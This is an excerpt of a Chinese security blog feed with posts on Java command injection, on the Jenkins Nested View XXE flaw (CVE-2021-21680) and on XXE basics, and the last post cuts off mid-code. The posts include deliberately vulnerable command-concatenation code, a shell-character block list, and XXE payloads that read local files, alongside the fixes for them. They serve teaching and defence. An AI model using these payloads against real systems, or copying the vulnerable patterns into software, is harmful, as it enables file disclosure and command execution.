class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdNoFix_1</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/K"</span>, <span class="string">"ping "</span> + ip&#125;).start();</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdWithFix</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 特殊字符检查</span></span><br><span class="line">            String[] blackChar = &#123;<span class="string">"&amp;"</span>, <span class="string">"|"</span>, <span class="string">";"</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span> (String s : blackChar) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ip.contains(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 正则匹配IP或者域名</span></span><br><span class="line">            String pattern = <span class="string">"(^\\d+(\\.\\d+)&#123;2&#125;\\.\\d+$)|([a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\\.?)"</span>;</span><br><span class="line">            <span class="keyword">boolean</span> ismatch = Pattern.matches(pattern, ip);</span><br><span class="line">            <span class="keyword">if</span>(!ismatch)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Process process = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"ping "</span> + ip&#125;).start();</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="warning-需要注意："><a href="#warning-需要注意：" class="headerlink" title=":warning:需要注意："></a>:warning:需要注意：</h4><p>一些单纯的拼接并不能造成我们预期的命令执行效果，可以参考大佬文章<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">Java下奇怪的命令执行</a>。如果不是以<code>bin/bash</code>或者<code>cmd.exe</code>这类支持特殊命令参数的命令开始，那么一般情况下不会造成严重的命令执行漏洞。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.zeddyu.info&#x2F;2019&#x2F;01&#x2F;17&#x2F;%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.lmxspace.com&#x2F;2019&#x2F;10&#x2F;08&#x2F;Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7046</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins Nested View插件XXE漏洞(CVE-2021-21680)分析</title>
      <link href="2021/09/08/Jenkins-Nested-View%E6%8F%92%E4%BB%B6XXE%E6%BC%8F%E6%B4%9E(CVE-2021-21680)%E5%88%86%E6%9E%90/"/>
      <url>2021/09/08/Jenkins-Nested-View%E6%8F%92%E4%BB%B6XXE%E6%BC%8F%E6%B4%9E(CVE-2021-21680)%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/252564" target="_blank" rel="noopener">https://www.anquanke.com/post/id/252564</a></p><h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>逆推这个漏洞本身不难，主要记录下思路。</p><p>先看下漏洞描述：<br>该插件 1.20 及更早版本未配置其 XML 转换器以防止 XML 外部实体 (XXE) 攻击。这使攻击者能够配置视图，让 Jenkins 解析精心设计的视图 XML 定义，该定义使用外部实体从 Jenkins 控制器或服务器端请求伪造中提取秘密。<br>该插件 1.21 禁用了其 XML 转换器的外部实体解析。</p><p>根据漏洞描述可以提取关键信息：</p><ol><li>XXE漏洞</li><li>漏洞出现在配置视图处</li></ol><h4 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h4><p>Jenkins在github提交了修复代码，<a href="https://github.com/jenkinsci/nested-view-plugin/commit/79787294f034b3009c3de557c6441c9ceba936b8" target="_blank" rel="noopener">修复后的版本和1.19.1对比</a>如下图。定位代码修改处，主要是updateByXml方法添加限制对指外部DTD的访问来进行修复。</p><p><img src="/imgs/image-20210902163652066.png" alt="image-20210902163652066"></p><p>updateByXml方法在doConfigDotXml中被调用。当请求方法时GET时会将NestedView作为XML数据返回，当请求方法是POST时，执行<code>updateByXml((Source)new StreamSource(req.getReader()))</code>将请求数据作为Source进行XML解析。那么我们只需要请求的时候设置HTTP method为POST，就可以对NestedView进行更新，然后用GET方法来读取。</p><p><img src="/imgs/image-20210903172916031.png" alt="image-20210903172916031"></p><p>入口具体的api在哪里？在<a href="https://issues.jenkins.io/browse/JENKINS-8927?page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel&showAll=true" target="_blank" rel="noopener">这个链接</a>找到了-<code>/user/view/viewname/config.xml</code>。现在我们只要更新config.xml文件就能调用doConfigDotXml方法，那么xml文件的内容就能够传入到请求流从而进行解析。</p><p><img src="/imgs/image-20210903173507516.png" alt="image-20210903173507516"></p><p>现在的问题是怎么构造xml文件？既然能通过GET获取XML数据，我们可以在页面创建一个nested view，通过查看历史创建的nested view的config.xml文件就能够来构造我们想要的XML。</p><p><img src="/imgs/image-20210903174736107.png" alt="image-20210903174736107"></p><p>现在只要在nested view的config.xml文件中插入dtd，就可以达到我们的目的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE description [</span><br><span class="line">&lt;!ENTITY description SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;E:&#x2F;111.txt&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure><p>另外需要注意，Jenkins配置了crumb来防御CSRF攻击，所以请求的时候在url后面加上<code>Jenkins-Crumb</code>，<code>Jenkins-Crumb</code>的值可以通过api<code>/crumbIssuer/api/json</code>获取。</p><p><img src="/imgs/image-20210903174249428.png" alt="image-20210903174249428"></p><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>此次漏洞主要通过补丁对比反推漏洞，漏洞本身不复杂。首先根据描述提取关键信息比如什么漏洞类型、大致的漏洞位置，根据补丁修复代码，反推出漏洞。该漏洞是一个典型XXE漏洞，通过TransformerFactory使用了默认的解析方法，没有对dtd禁止。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(req.getReader());</span><br><span class="line">Transformer t = TransformerFactory.newInstance().newTransformer();</span><br><span class="line">t.transform(source, <span class="keyword">new</span> StreamResult(out));</span><br></pre></td></tr></table></figure><p>下面是TransformerFactory解析xml防御XXE漏洞的典型方法，禁止外部DTD。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, <span class="keyword">true</span>);</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br></pre></td></tr></table></figure><p>除了TransformerFactory，在Java中还有许多XML解析工具，如果需要防御XXE漏洞，基本都是通过禁用DTD及外部实体来解决的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilder</span><br><span class="line">XMLStreamReader</span><br><span class="line">SAXBuilder</span><br><span class="line">SAXParser</span><br><span class="line">SAXReader</span><br><span class="line">XMLReader</span><br><span class="line">SAXSource</span><br><span class="line">SAXTransformerFactory</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h4><p><a href="https://issues.jenkins.io/browse/JENKINS-8927?page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel&amp;showAll=true" target="_blank" rel="noopener">https://issues.jenkins.io/browse/JENKINS-8927?page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel&amp;showAll=true</a><br><a href="https://www.jenkins.io/security/advisory/2021-08-31/" target="_blank" rel="noopener">https://www.jenkins.io/security/advisory/2021-08-31/</a><br><a href="https://github.com/jenkinsci/nested-view-plugin/commit/79787294f034b3009c3de557c6441c9ceba936b8" target="_blank" rel="noopener">https://github.com/jenkinsci/nested-view-plugin/commit/79787294f034b3009c3de557c6441c9ceba936b8</a><br><a href="https://www.apiref.com/java11-zh/java.xml/javax/xml/XMLConstants.html" target="_blank" rel="noopener">https://www.apiref.com/java11-zh/java.xml/javax/xml/XMLConstants.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> CVE-2021-21680 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java XXE漏洞实验及总结</title>
      <link href="2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>之前分析了下Jenkins Nested View插件XXE漏洞(CVE-2021-21680)，就想着总结下Java的XXE。</p><p>Google了下发现<a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">有前辈已经总结好了</a>，所以就照着做下实验。</p><h3 id="0x02-XXE漏洞基础"><a href="#0x02-XXE漏洞基础" class="headerlink" title="0x02 XXE漏洞基础"></a>0x02 XXE漏洞基础</h3><h4 id="XXE漏洞原理："><a href="#XXE漏洞原理：" class="headerlink" title="XXE漏洞原理："></a>XXE漏洞原理：</h4><p>XXE全称XML External Entity，XML外部实体注入。通过在XML中声明DTD外部实体，并在XML中引入，便可以获取我们想要的数据。</p><h4 id="XML文档结构："><a href="#XML文档结构：" class="headerlink" title="XML文档结构："></a>XML文档结构：</h4><p>XML主要由7个部分组成：文档声明、标签/元素、属性、注释、实体字符、CDATA 字符数据区、处理指令。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML文档声明；另外也是一个处理指令，&lt;? xxx ?&gt;就是处理指令的格式--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--bookstore根元素、book子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--category、lang都是属性--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"COOKING"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!--&amp;lt;实体字符 是一个预定义的实体引用，这里也可以引用dtd中定义的实体，以 &amp; 开头, 以;结尾--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="symbol">&amp;lt;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--script这里是CDATA，不能被xml解析器解析，可以被JavaScript解析--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">            &lt;![CDATA[</span><br><span class="line"><span class="actionscript">   <span class="function"><span class="keyword">function</span> <span class="title">matchwo</span><span class="params">(a,b)</span></span></span></span><br><span class="line">   &#123;</span><br><span class="line">    if (a &lt; b &amp;&amp; a &lt; 0) then</span><br><span class="line"><span class="actionscript">      &#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span></span></span><br><span class="line"><span class="actionscript">      &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span></span><br><span class="line">   &#125;</span><br><span class="line">   ]]&gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。CDATA 部分中的所有内容都会被解析器忽略。</p><p>CDATA 部分由 “*<![CDATA[*" 开始，由 "*]]>*” 结束，某些文本比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</p><h4 id="XML示例："><a href="#XML示例：" class="headerlink" title="XML示例："></a>XML示例：</h4><p>(1)如下实例，<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</code>是XML声明，<code>&lt;!DOCTYPE description [&lt;!ENTITY abc &quot;123213123123123&quot; &gt;]&gt;</code>就是DTD文档类型定义，<code>&lt;description&gt;&amp;abc;&lt;/description&gt;</code>是文档元素 其中abc就是引用的dtd中的abc。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">description</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">abc</span> <span class="meta-string">"123213123123123"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;abc;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="DTD文档类型定义："><a href="#DTD文档类型定义：" class="headerlink" title="DTD文档类型定义："></a>DTD文档类型定义：</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以从外部引用。DTD实体也分为外部引用和内部定义。</p><h5 id="DTD两种引入方式："><a href="#DTD两种引入方式：" class="headerlink" title="DTD两种引入方式："></a>DTD两种引入方式：</h5><p>在XML内部声明DTD：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在XML中引入外部DTD文档</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"note.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--而note.dtd的内容为:--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">message</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="DTD实体两种方式："><a href="#DTD实体两种方式：" class="headerlink" title="DTD实体两种方式："></a>DTD实体两种方式：</h5><p>实体又分为一般实体和参数实体：一般实体的声明语法<code>&amp;实体名；</code>；参数实体只能在DTD中使用，参数实体的声明格式：<code>%实体名；</code>。</p><p>内部实体：</p><p>在dtd中定义了一个名为test的实体，实体的值为test-value：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test &quot;test-value&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部实体：</strong></p><p>在dtd中定义了一个名为test的实体，实体的值为URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;&#x2F;1.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;http:&#x2F;&#x2F;test.com&#x2F;1.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="常见的xml解析方式有以下四种"><a href="#常见的xml解析方式有以下四种" class="headerlink" title="常见的xml解析方式有以下四种:"></a>常见的xml解析方式有以下四种:</h4><p>1)DOM生成和解析XML文档</p><p>2)SAX生成和解析XML文档</p><p>3)DOM4J生成和解析XML文档</p><p>4)JDOM生成和解析DOM文档</p><p>SAX是以流的形式读取XML文档中的内容，并在读取过程中自动调用预先定义的处理方法；DOM是将整个xml文档中的内容以tree的形式存储在内存当中，可以对这个tree中的任意一个节点进行操作，SAX则不能。SAX不适合用来修改xml内容，DOM需要耗费大量内存</p><h3 id="0x03-实验"><a href="#0x03-实验" class="headerlink" title="0x03 实验"></a>0x03 实验</h3><h4 id="在Java中有很多jar包可以来解析XML："><a href="#在Java中有很多jar包可以来解析XML：" class="headerlink" title="在Java中有很多jar包可以来解析XML："></a>在Java中有很多jar包可以来解析XML：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><p>笔者本次通过web servlet实现引用以上部分jar包解析xml来进行实验，并补充其中的修复方案。本次实验借鉴了<a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">前辈总结的代码</a>。</p><h4 id="实验1-SAXBuilder解析xml并修复漏洞"><a href="#实验1-SAXBuilder解析xml并修复漏洞" class="headerlink" title="实验1 SAXBuilder解析xml并修复漏洞"></a>实验1 SAXBuilder解析xml并修复漏洞</h4><p>实验编写的servlet如下，其中postNoFixXxe是未修复时的方法，postWithFixXxe是修复后的方法，修复时通过 builder.setFeature设置外部实体不能方法从而防御xxe漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.output.XMLOutputter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXBuilderServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span 